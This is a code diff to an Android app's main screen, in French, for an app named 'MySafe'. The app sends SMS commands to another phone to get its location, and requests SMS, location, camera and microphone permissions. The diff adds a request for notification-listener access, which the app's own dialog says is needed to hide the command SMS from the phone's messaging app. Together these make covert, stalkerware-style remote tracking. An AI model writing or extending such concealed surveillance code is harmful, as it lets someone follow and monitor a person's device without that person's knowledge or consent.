@@ -28,6 +28,13 @@ class MainActivity : AppCompatActivity() {
     companion object {
         private const val TAG = "MySafe_Main"
         private const val REQUEST_PERMISSIONS = 1001
+        
+        // ✅ Pour l'accès aux notifications
+        private fun hasNotificationAccess(context: Context): Boolean {
+            val enabled = Settings.Secure.getString(context.contentResolver, 
+                Settings.Secure.ENABLED_NOTIFICATION_LISTENERS)
+            return enabled?.contains(context.packageName) == true
+        }
     }
 
     private lateinit var map: MapView
@@ -83,7 +90,7 @@ class MainActivity : AppCompatActivity() {
         historyAdapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, historyList)
         historyListView.adapter = historyAdapter
 
-        statusText.text = "⏳ En attente de commande..."
+        statusText.text = "⏳ Vérification des permissions..."
 
         requestAllPermissions()
 
@@ -117,15 +124,14 @@ class MainActivity : AppCompatActivity() {
             derniereReception = 0
             statusText.text = "📤 Demande position..."
             
-            // ✅ SI C'EST TON PROPRE NUMÉRO → PAS DE SMS ! EXÉCUTION DIRECTE !
             if (estMonNumero(target)) {
-                Log.d(TAG, "📍 Même numéro → récupération directe de ma position")
+                Log.d(TAG, "📍 Même numéro → récupération directe")
                 obtenirMaPositionDirect()
             } else {
                 envoyerCommande(target, "MYSAFE_SEND_POS")
                 android.os.Handler(mainLooper).postDelayed({
                     if (derniereReception == 0L) {
-                        statusText.text = "⚠️ Pas de réponse — vérifiez:\n• Permissions SMS\n• Numéro correct"
+                        statusText.text = "⚠️ Pas de réponse — vérifiez:\n• Accès notifications\n• Permissions SMS\n• Numéro correct"
                     }
                 }, 15000)
             }
@@ -137,7 +143,8 @@ class MainActivity : AppCompatActivity() {
                     startService(Intent(this, FloatingMapWindow::class.java))
                     Toast.makeText(this, "🗺️ Carte flottante ouverte !", Toast.LENGTH_LONG).show()
                 } else {
-                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, android.net.Uri.parse("package:$packageName"))
+                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, 
+                        android.net.Uri.parse("package:$packageName"))
                     startActivity(intent)
                     Toast.makeText(this, "⚠️ Autorisez l'affichage par-dessus les apps", Toast.LENGTH_LONG).show()
                 }
@@ -151,9 +158,20 @@ class MainActivity : AppCompatActivity() {
         Log.d(TAG, "✅ MainActivity prête !")
     }
 
+    override fun onResume() {
+        super.onResume()
+        map.onResume()
+        
+        // ✅ Vérifie si l'accès aux notifications est accordé quand on revient
+        if (!hasNotificationAccess(this)) {
+            Toast.makeText(this, "⚠️ ACCÈS AUX NOTIFICATIONS MANQUANT !\n→ Autorisez MySafe pour masquer les SMS", 
+                Toast.LENGTH_LONG).show()
+        }
+    }
+
     private fun estMonNumero(numero: String): Boolean {
-        val monNumeroNettoye = numero.replace(Regex("[^0-9]"), "").takeLast(9)
-        return monNumeroNettoye.length >= 6
+        val nettoye = numero.replace(Regex("[^0-9]"), "").takeLast(9)
+        return nettoye.length >= 6
     }
 
     private fun obtenirMaPositionDirect() {
@@ -165,9 +183,7 @@ class MainActivity : AppCompatActivity() {
 
         val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
         var loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-        if (loc == null) {
-            loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-        }
+        if (loc == null) loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
 
         if (loc == null) {
             statusText.text = "❌ Position inconnue — activez le GPS et bougez !"
@@ -176,7 +192,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
-        Log.d(TAG, "✅ Position récupérée directement: ${loc.latitude}, ${loc.longitude}")
+        Log.d(TAG, "✅ Position récupérée: ${loc.latitude}, ${loc.longitude}")
         
         val updateIntent = Intent("MYSAFE_POSITION_UPDATE")
         updateIntent.putExtra("lat", loc.latitude)
@@ -187,29 +203,38 @@ class MainActivity : AppCompatActivity() {
 
     private fun requestAllPermissions() {
         val needed = mutableListOf<String>()
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
-            needed.add(Manifest.permission.SEND_SMS)
-        }
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
-            needed.add(Manifest.permission.RECEIVE_SMS)
-        }
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-            needed.add(Manifest.permission.READ_SMS)
-        }
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            needed.add(Manifest.permission.ACCESS_FINE_LOCATION)
-        }
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-            needed.add(Manifest.permission.CAMERA)
-        }
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-            needed.add(Manifest.permission.RECORD_AUDIO)
-        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) 
+            != PackageManager.PERMISSION_GRANTED) needed.add(Manifest.permission.SEND_SMS)
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) 
+            != PackageManager.PERMISSION_GRANTED) needed.add(Manifest.permission.RECEIVE_SMS)
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) 
+            != PackageManager.PERMISSION_GRANTED) needed.add(Manifest.permission.READ_SMS)
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
+            != PackageManager.PERMISSION_GRANTED) needed.add(Manifest.permission.ACCESS_FINE_LOCATION)
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
+            != PackageManager.PERMISSION_GRANTED) needed.add(Manifest.permission.CAMERA)
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) 
+            != PackageManager.PERMISSION_GRANTED) needed.add(Manifest.permission.RECORD_AUDIO)
         
         if (needed.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, needed.toTypedArray(), REQUEST_PERMISSIONS)
+        }
+        
+        // ✅ DEMANDE SPÉCIALE : Accès aux notifications
+        if (!hasNotificationAccess(this)) {
+            android.app.AlertDialog.Builder(this)
+                .setTitle("🔔 Permission requise")
+                .setMessage("Pour masquer les SMS de commande dans la messagerie, " +
+                        "MySafe a besoin de l'ACCÈS AUX NOTIFICATIONS.\n\n" +
+                        "Cliquez sur OK → Trouvez MySafe → Activez-le → Revenez !")
+                .setPositiveButton("OK") { _, _ ->
+                    val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
+                    startActivity(intent)
+                }
+                .setCancelable(false)
+                .show()
         } else {
-            Toast.makeText(this, "✅ Toutes permissions accordées !", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "✅ Toutes permissions accordées ! Prêt !", Toast.LENGTH_SHORT).show()
         }
     }
 
@@ -219,19 +244,20 @@ class MainActivity : AppCompatActivity() {
             var allOk = true
             for ((i, p) in permissions.withIndex()) {
                 val ok = grantResults.getOrElse(i) { -1 } == PackageManager.PERMISSION_GRANTED
-                Log.d(TAG, "Permission $p : ${if(ok) "✅" else "❌"}")
+                Log.d(TAG, "$p : ${if(ok) "✅" else "❌"}")
                 if (!ok) allOk = false
             }
             if (allOk) {
-                Toast.makeText(this, "✅ TOUTES permissions accordées ! Prêt !", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "✅ Permissions système accordées !", Toast.LENGTH_SHORT).show()
             }
         }
     }
 
     private fun envoyerCommande(numero: String, commande: String) {
-        Log.d(TAG, "📤 ENVOYER à $numero : \"$commande\"")
+        Log.d(TAG, "📤 Envoi à $numero : $commande")
         
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) 
+            != PackageManager.PERMISSION_GRANTED) {
             Toast.makeText(this, "❌ Permission SMS manquante", Toast.LENGTH_SHORT).show()
             return
         }
@@ -241,10 +267,10 @@ class MainActivity : AppCompatActivity() {
             try {
                 smsManager.sendTextMessage(numero, null, commande, null, null)
                 Toast.makeText(this, "📩 Commande envoyée !", Toast.LENGTH_SHORT).show()
-                Log.d(TAG, "✅ SMS envoyé")
             } catch (e: Exception) {
                 try {
-                    smsManager.sendDataMessage(numero, null, 50006.toShort(), commande.toByteArray(Charsets.UTF_8), null, null)
+                    smsManager.sendDataMessage(numero, null, 50006.toShort(), 
+                        commande.toByteArray(Charsets.UTF_8), null, null)
                     Toast.makeText(this, "📩 Commande envoyée !", Toast.LENGTH_SHORT).show()
                 } catch (e2: Exception) {
                     Toast.makeText(this, "❌ Échec envoi", Toast.LENGTH_LONG).show()
@@ -280,7 +306,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     override fun onPause() { super.onPause(); map.onPause() }
-    override fun onResume() { super.onResume(); map.onResume() }
     override fun onDestroy() {
         super.onDestroy()
         unregisterReceiver(positionReceiver)
